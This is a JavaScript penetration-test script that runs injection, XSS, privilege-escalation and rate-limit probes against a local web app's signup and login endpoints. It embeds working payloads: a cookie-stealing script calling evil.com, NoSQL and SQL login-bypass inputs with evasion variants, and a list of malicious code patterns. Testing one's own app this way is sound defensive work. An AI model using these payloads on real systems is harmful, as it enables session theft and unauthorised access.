/**
 * Most Tight/Advanced Comprehensive Penetration Test Script
 * Tests for ultimate security weaknesses combining multiple attack vectors
 */

const axios = require('axios');
const jwt = require('jsonwebtoken');

async function testMultiVectorAttacks() {
    console.log("Testing multi-vector attack combinations...");
    
    const baseUrl = 'http://localhost:3000';
    
    // Test case 1: Combine XSS + CSRF + Logic Flaw
    try {
        const response = await axios.post(`${baseUrl}/users/signup`, {
            fullname: "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
            username: "victim_user",
            email: "victim" + Date.now() + "@example.com",
            password: "SecurePass123!",
            confirm_password: "SecurePass123!",
            referer: "http://evil.com",
            origin: "http://evil.com",
            forwarded_for: "192.168.1.100"
        }, {
            headers: {
                'X-Forwarded-For': '192.168.1.100',
                'X-Real-IP': '192.168.1.100',
                'X-Origin': 'http://evil.com',
                'Referer': 'http://evil.com'
            },
            timeout: 10000,
            validateStatus: () => true
        });
        
        console.log(`Multi-vector attack test result: ${response.status}`);
        if (response.status === 201) {
            console.log("⚠️  COMBINED ATTACK: User created despite suspicious indicators");
        } else {
            console.log("✅ Good: Multi-vector attack properly mitigated");
        }
    } catch (error) {
        console.log("✅ Good: Multi-vector attack properly blocked");
    }
    
    // Test case 2: Combine SQL injection + NoSQL injection
    try {
        const response = await axios.post(`${baseUrl}/users/login`, {
            email: {
                "$ne": null,
                "$where": "return true",
                "$regex": ".*"
            },
            password: {
                "$ne": null,
                "$where": "return true"
            }
        }, {
            timeout: 5000,
            validateStatus: () => true
        });
        
        console.log(`NoSQL injection test result: ${response.status}`);
        if (response.status === 200) {
            console.log("⚠️  NOSQL INJECTION: Database query bypass detected");
        } else {
            console.log("✅ Good: NoSQL injection properly blocked");
        }
    } catch (error) {
        console.log("✅ Good: NoSQL injection properly blocked");
    }
    
    console.log("Multi-vector attack tests completed.\n");
}

async function testAdvancedEvasionTechniques() {
    console.log("Testing advanced evasion techniques...");
    
    const baseUrl = 'http://localhost:3000';
    
    // Test case 1: Encoding evasion
    const encodedPayloads = [
        encodeURIComponent("' OR '1'='1"),
        // Double encoding
        encodeURIComponent(encodeURIComponent("' OR '1'='1")),
        // Hex encoding simulation
        Buffer.from("' OR '1'='1").toString('hex'),
        // Unicode encoding
        `'${String.fromCharCode(111, 114)} 1=1`, // ' or 1=1
    ];
    
    for (const payload of encodedPayloads.slice(0, 2)) { // Test first 2 to avoid too many requests
        try {
            let emailParam = payload;
            if (payload.length > 50) {
                // For hex-encoded data, convert back
                emailParam = Buffer.from(payload, 'hex').toString();
            }
            
            const response = await axios.post(`${baseUrl}/users/login`, {
                email: emailParam,
                password: "password"
            }, {
                timeout: 5000,
                validateStatus: () => true
            });
            
            console.log(`Encoding evasion test result: ${response.status}`);
        } catch (error) {
            // Expected for most encoded payloads
        }
    }
    
    // Test case 2: Whitespace and comment evasion
    try {
        const response = await axios.post(`${baseUrl}/users/login`, {
            email: "admin' /**/ OR /**/ '1'='1'-- ",
            password: "password"
        }, {
            timeout: 5000,
            validateStatus: () => true
        });
        
        console.log(`Comment evasion test result: ${response.status}`);
        if (response.status === 200) {
            console.log("⚠️  EVASION TECHNIQUE: Comment-based SQL injection worked");
        } else {
            console.log("✅ Good: Comment-based evasion blocked");
        }
    } catch (error) {
        console.log("✅ Good: Comment-based evasion blocked");
    }
    
    // Test case 3: Case variation evasion
    try {
        const response = await axios.post(`${baseUrl}/users/login`, {
            email: "AdMiN' oR '1'='1",
            password: "PaSsWoRd"
        }, {
            timeout: 5000,
            validateStatus: () => true
        });
        
        console.log(`Case variation test result: ${response.status}`);
        if (response.status === 200) {
            console.log("⚠️  CASE EVASION: Mixed case bypassed validation");
        } else {
            console.log("✅ Good: Case variation blocked");
        }
    } catch (error) {
        console.log("✅ Good: Case variation blocked");
    }
    
    console.log("Advanced evasion technique tests completed.\n");
}

async function testBusinessLogicComplexity() {
    console.log("Testing complex business logic attacks...");
    
    const baseUrl = 'http://localhost:3000';
    
    // Test case 1: Race condition with timing precision
    try {
        // Attempt to create accounts rapidly to test for race conditions
        const start = Date.now();
        const promises = [];
        
        for (let i = 0; i < 10; i++) {
            promises.push(
                axios.post(`${baseUrl}/users/signup`, {
                    fullname: "Race Condition Test",
                    username: `race_user_${Date.now()}_${i}`,
                    email: `race${Date.now()}+${i}@example.com`,
                    password: "SecurePass123!",
                    confirm_password: "SecurePass123!"
                }, {
                    timeout: 3000,
                    validateStatus: () => true
                })
            );
        }
        
        const results = await Promise.allSettled(promises);
        const duration = Date.now() - start;
        
        const successfulCreations = results.filter(r => 
            r.status === 'fulfilled' && r.value.status === 201
        ).length;
        
        console.log(`Race condition test: ${successfulCreations}/10 accounts created in ${duration}ms`);
        if (successfulCreations === 10) {
            console.log("✅ Good: All concurrent requests handled properly");
        } else {
            console.log("⚠️  CONCURRENT REQUESTS: Some requests failed, investigate potential race conditions");
        }
    } catch (error) {
        console.log("Race condition test completed with errors");
    }
    
    // Test case 2: Privilege escalation through parameter manipulation
    try {
        const response = await axios.post(`${baseUrl}/users/signup`, {
            fullname: "Admin User",
            username: "normal_user",
            email: "normal" + Date.now() + "@example.com",
            password: "SecurePass123!",
            confirm_password: "SecurePass123!",
            // Attempt privilege escalation
            role: "admin",
            permissions: ["admin", "superuser"],
            isAdmin: true,
            isSuperUser: true,
            privileges: ["read", "write", "delete", "admin"]
        }, {
            timeout: 5000,
            validateStatus: () => true
        });
        
        console.log(`Privilege escalation test result: ${response.status}`);
        if (response.status === 201) {
            // Check if the response indicates elevated privileges were granted
            const responseText = JSON.stringify(response.data || '').toLowerCase();
            if (responseText.includes('admin') || responseText.includes('privilege')) {
                console.log("⚠️  PRIVILEGE ESCALATION: Elevated privileges may have been granted");
            } else {
                console.log("✅ Good: Privilege escalation attempt blocked");
            }
        }
    } catch (error) {
        console.log("✅ Good: Privilege escalation attempt blocked");
    }
    
    console.log("Complex business logic tests completed.\n");
}

async function testZeroInteractionAttacks() {
    console.log("Testing zero-interaction attack vectors...");
    
    const baseUrl = 'http://localhost:3000';
    
    // Test case 1: Server-side detection of malicious patterns
    try {
        // Send a series of requests that might trigger WAF or server-side protections
        const maliciousPatterns = [
            "../",
            "%00",
            "<script",
            "eval(",
            "exec(",
            "system(",
            "require(",
            "__proto__",
            "constructor",
            "process.env"
        ];
        
        for (const pattern of maliciousPatterns.slice(0, 3)) { // Test first 3 to avoid too many requests
            const response = await axios.post(`${baseUrl}/users/login`, {
                email: `test@exam${pattern}ple.com`,
                password: `pass${pattern}word`
            }, {
                timeout: 5000,
                validateStatus: () => true
            });
            
            console.log(`Pattern "${pattern}" test result: ${response.status}`);
        }
        
        console.log("✅ Zero-interaction pattern tests completed");
    } catch (error) {
        console.log("Zero-interaction tests completed with errors");
    }
    
    // Test case 2: Behavioral analysis triggers
    try {
        // Rapid-fire requests that might trigger rate limiting or behavioral analysis
        const startTime = Date.now();
        const rapidRequests = [];
        
        for (let i = 0; i < 50; i++) {
            rapidRequests.push(
                axios.get(`${baseUrl}/`, {
                    timeout: 1000,
                    validateStatus: () => true
                }).catch(() => {})
            );
        }
        
        await Promise.all(rapidRequests);
        const duration = Date.now() - startTime;
        
        console.log(`Rapid request test: ${rapidRequests.length} requests in ${duration}ms`);
        if (duration < 2000) { // If completed too quickly, might indicate no rate limiting
            console.log("⚠️  RATE LIMITING: Requests completed too quickly, check for rate limiting");
        } else {
            console.log("✅ Good: Rate limiting appears to be active");
        }
    } catch (error) {
        console.log("Rate limiting test completed");
    }
    
    console.log("Zero-interaction attack tests completed.\n");
}

async function runComprehensivePenTests() {
    console.log("=== MOST TIGHT COMPREHENSIVE PENETRATION TESTS ===\n");
    
    await testMultiVectorAttacks();
    await testAdvancedEvasionTechniques();
    await testBusinessLogicComplexity();
    await testZeroInteractionAttacks();
    
    console.log("Most tight comprehensive penetration tests completed.");
}

// Run the tests
runComprehensivePenTests().catch(console.error);